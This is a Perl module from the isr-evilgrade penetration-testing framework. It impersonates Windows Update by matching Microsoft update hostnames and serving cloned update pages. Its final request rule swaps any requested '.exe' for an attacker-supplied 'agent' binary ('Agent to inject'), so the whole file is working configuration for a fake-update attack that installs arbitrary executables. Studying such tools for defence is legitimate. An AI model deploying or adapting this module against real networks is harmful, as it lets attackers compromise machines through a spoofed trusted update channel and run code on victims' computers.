###############
# winupdate.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::winupdate;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'    => 'Windows Update',
    'version' => '1.0',
    'appver'  => '< ie6 lastversion, ie7 7.0.5730.13, ie8 8.0.60001.18702',
    'author'  => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},
    'vh' =>
        '(windowsupdate.microsoft.com|update.microsoft.com|www.microsoft.com|go.microsoft.com)',
    'request' => [
        {   'req' =>
                '(/redirect.asp|^/$|/microsoftupdate/v6/default.aspx|redir.dll)',
            'type' => 'file',
            'file' => './include/wupdate/init.html',
        },
        {   'req' => '(/fwlink/\?linkid|/fwlink/\?LinkId)'
            ,    #/fwlink/?LinkId=119721&clcid=0x409
            'type' => 'string',

            'cheader' => "HTTP/1.1 302 Found\r\n"
                . "Location: http://go.microsoft.com/dotnetfx35setup.exe\r\n"
                . "Content-Length: 0 \r\n"
                . "Connection: close \r\n\r\n",
        },
        {   'req'   => '/process.aspx',
            'type'  => 'string',
            'parse' => 1,
            'string' =>
                '<html><script>parent.window.location="http://www.microsoft.com/downloads/thankyou.aspx?familyId=<%FAMILYID%>&displayLang=en"</script></html>',
            'file' => './include/wupdate/init.html',
        },

        {   'req'   => '/process.aspx',
            'type'  => 'string',
            'parse' => 1,
            'string' =>
                '<html><script>parent.window.location="http://www.microsoft.com/downloads/thankyou.aspx?familyId=<%FAMILYID%>&displayLang=en"</script></html>',
            'file' => './include/wupdate/init.html',
        },

        {   'req'  => '/inc/mstoolbar.htm',
            'type' => 'file',
            'file' => './include/wupdate/inc/mstoolbar.htm',
        },

        {   'req'  => '/inc/spupdateids.js',
            'type' => 'file',
            'file' => './include/wupdate/inc/spupdateids.js',
        },

        {   'req'  => '/inc/trans_pixel.gif',
            'type' => 'file',
            'file' => './include/wupdate/inc/trans_pixel.gif',
        },

        {   'req'  => '/inc/toc_archivos/arrow.gif',
            'type' => 'file',
            'file' => './include/wupdate/inc/toc_archivos/arrow.gif',
        },

        {   'req'  => '/inc/toc_archivos/hcp.css',
            'type' => 'file',
            'file' => './include/wupdate/inc/toc_archivos/hcp.css',
        },

        {   'req'  => '/inc/toc_archivos/toc.css',
            'type' => 'file',
            'file' => './include/wupdate/inc/toc_archivos/toc.css',
        },

        {   'req'  => '/inc/toc_archivos/toc.js',
            'type' => 'file',
            'file' => './include/wupdate/inc/toc_archivos/toc.js',
        },

        {   'req'  => '/inc/toc_archivos/tgar.js',
            'type' => 'file',
            'file' => './include/wupdate/inc/toc_archivos/tgar.js',
        },

        {   'req'  => '/inc/toc_archivos/update_webtrends.js',
            'type' => 'file',
            'file' =>
                './include/wupdate/inc/toc_archivos/update_webtrends.js',
        },

        {   'req'  => '/inc/commontop.js',
            'type' => 'file',
            'file' => './include/wupdate/inc/commontop.js',
        },

        {   'req'  => '/inc/mstoolbar_archivos/v6.htm',
            'type' => 'file',
            'file' => './include/wupdate/inc/mstoolbar_archivos/v6.htm',
        },

        {   'req'  => '/inc/mstoolbar_archivos/css.css',
            'type' => 'file',
            'file' => './include/wupdate/inc/mstoolbar_archivos/css.css',
        },

        {   'req'  => '/inc/mstoolbar_archivos/ms_masthead_ltr.gif',
            'type' => 'file',
            'file' =>
                './include/wupdate/inc/mstoolbar_archivos/ms_masthead_ltr.gif',
        },

        {   'req'  => '/inc/mstoolbar_archivos/subbanner.jpg',
            'type' => 'file',
            'file' =>
                './include/wupdate/inc/mstoolbar_archivos/subbanner.jpg',
        },

        {   'req'  => '/inc/redirect.js',
            'type' => 'file',
            'file' => './include/wupdate/inc/redirect.js',
        },

        {   'req'  => '/inc/footer.htm',
            'type' => 'file',
            'file' => './include/wupdate/inc/footer.htm',
        },

        {   'req'   => '/inc/splash.htm',
            'type'  => 'file',
            'parse' => 1,
            'file'  => './include/wupdate/inc/splash.htm',
        },

        {   'req'  => '/inc/webcomtop.js',
            'type' => 'file',
            'file' => './include/wupdate/inc/webcomtop.js',
        },

        {   'req' =>
                '/inc/splash_archivos/trans_pixel_archivos/trans_pixel.gif',
            'type' => 'file',
            'file' =>
                './include/wupdate/inc/splash_archivos/trans_pixel_archivos/trans_pixel.gif',
        },

        {   'req'  => '/inc/splash_archivos/icon.plus.gif',
            'type' => 'file',
            'file' => './include/wupdate/inc/splash_archivos/icon.plus.gif',
        },

        {   'req'  => '/inc/splash_archivos/trans_pixel.gif',
            'type' => 'file',
            'file' => './include/wupdate/inc/splash_archivos/trans_pixel.gif',
        },

        {   'req'  => '/inc/splash_archivos/content.js',
            'type' => 'file',
            'file' => './include/wupdate/inc/splash_archivos/content.js',
        },

        {   'req'  => '/inc/splash_archivos/hcp.css',
            'type' => 'file',
            'file' => './include/wupdate/inc/splash_archivos/hcp.css',
        },

        {   'req'  => '/inc/splash_archivos/tgar.js',
            'type' => 'file',
            'file' => './include/wupdate/inc/splash_archivos/tgar.js',
        },

        {   'req'  => '/inc/splash_archivos/content.css',
            'type' => 'file',
            'file' => './include/wupdate/inc/splash_archivos/content.css',
        },

        {   'req'  => '/inc/splash_archivos/update_webtrends.js',
            'type' => 'file',
            'file' =>
                './include/wupdate/inc/splash_archivos/update_webtrends.js',
        },

        {   'req'  => '/inc/footer_archivos/v6.htm',
            'type' => 'file',
            'file' => './include/wupdate/inc/footer_archivos/v6.htm',
        },

        {   'req'  => '/inc/footer_archivos/css.css',
            'type' => 'file',
            'file' => './include/wupdate/inc/footer_archivos/css.css',
        },

        {   'req'  => '/inc/toc.htm',
            'type' => 'file',
            'file' => './include/wupdate/inc/toc.htm',
        },

        {   'req'  => '/inc/resultslist.js',
            'type' => 'file',
            'file' => './include/wupdate/inc/resultslist.js',
        },

        {   'req'  => '/inc/tgar.js',
            'type' => 'file',
            'file' => './include/wupdate/inc/tgar.js',
        },

        {   'req'    => '.exe',     #regex friendly
            'type'   => 'agent',    #file|string|agent|install
            'method' => '',         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => ''
        },

    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'rnd1' => {
            'val' =>
                "isrcore::utils::RndAlpha(8).'-'.isrcore::utils::RndAlpha(4).'-'.isrcore::utils::RndAlpha(4).'-'.isrcore::utils::RndAlpha(4).'-'.isrcore::utils::RndAlpha(12)",
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'rnd2' => {
            'val'     => "isrcore::utils::RndNum(5)",
            'hidden'  => 1,
            'dynamic' => 1,
        },

        'familyid' => {
            'val' => 'ad724ae0-e72d-4f54-9ab3-75b8eb148356',

        #1e1550cb-5e5d-48f5-b02b-20b602228de6 Internet Explorer 6 Service Pack
        #980bb421-950f-4825-8039-44cc961a47b8 XP security update
            'desc' =>
                "It's the microsoft familyid from download center default (Removal tool)"
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
